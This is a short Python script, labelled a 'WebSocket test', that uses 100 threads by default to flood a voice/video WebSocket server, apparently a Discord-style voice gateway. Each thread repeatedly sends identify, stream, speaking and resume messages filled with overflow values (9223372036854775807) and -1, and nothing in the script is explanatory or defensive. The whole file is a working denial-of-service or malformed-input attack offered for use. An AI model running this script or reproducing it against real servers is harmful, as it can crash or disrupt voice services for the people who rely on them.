import json as js2
import threading
import websocket
import argparse

def fatman(ws_server, serverid, myuid, sessionid, tokenn, origin):
    while True:
        try:
            ws = websocket.create_connection(f"{ws_server}", origin=origin)
            ws.send(js2.dumps({"op":0,"d":{"server_id":f"{serverid}","user_id":f"{myuid}","session_id":f"{sessionid}","token":f"{tokenn}","video":True,"streams":[{"type":"video","rid":"100","quality":-1},{"type":"video","rid":"50","quality":9223372036854775807}]}},separators=(",", ":")).encode("UTF-8"))
            ws.send(js2.dumps({"op":12,"d":{"audio_ssrc":-1,"video_ssrc":-1,"rtx_ssrc":9223372036854775807,"streams":[{"type":"video","rid":"100","ssrc":-1,"active":True,"quality":9223372036854775807,"rtx_ssrc":9223372036854775807,"max_bitrate":9223372036854775807,"max_framerate":9223372036854775807,"max_resolution":{"type":"fixed","width":9223372036854775807,"height":9223372036854775807}}]}},separators=(",", ":")).encode("UTF-8"))
            ws.send(js2.dumps({"op":5,"d":{"speaking":9223372036854775807,"delay":-1,"ssrc":9223372036854775807}},separators=(",", ":")).encode("UTF-8"))
            ws.send(js2.dumps({"op":3,"d":-1},separators=(",", ":")).encode("UTF-8"))
            print("sent")
            ws.close()
        except Exception as e:
            print(e)
            pass

def main():
    parser = argparse.ArgumentParser(description="WebSocket test")
    parser.add_argument("-w", "--websocket", required=True, help="WebSocket server URL")
    parser.add_argument("-s", "--serverid", required=True, help="Server ID")
    parser.add_argument("-u", "--userid", required=True, help="Your user ID")
    parser.add_argument("-e", "--sessionid", required=True, help="Session ID")
    parser.add_argument("-t", "--token", required=True, help="Token (not auth)")
    parser.add_argument("-o", "--origin", required=True, help="Origin header for WebSocket connection")
    parser.add_argument("-n", "--threads", type=int, default=100, help="Number of threads (default: 100)")
    
    args = parser.parse_args()
    
    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=fatman, args=(args.websocket, args.serverid, args.userid, args.sessionid, args.token, args.origin))
        t.daemon = True
        threads.append(t)
    
    for i in range(args.threads):
        threads[i].start()
    
    for i in range(args.threads):
        threads[i].join()

if __name__ == "__main__":
    main()
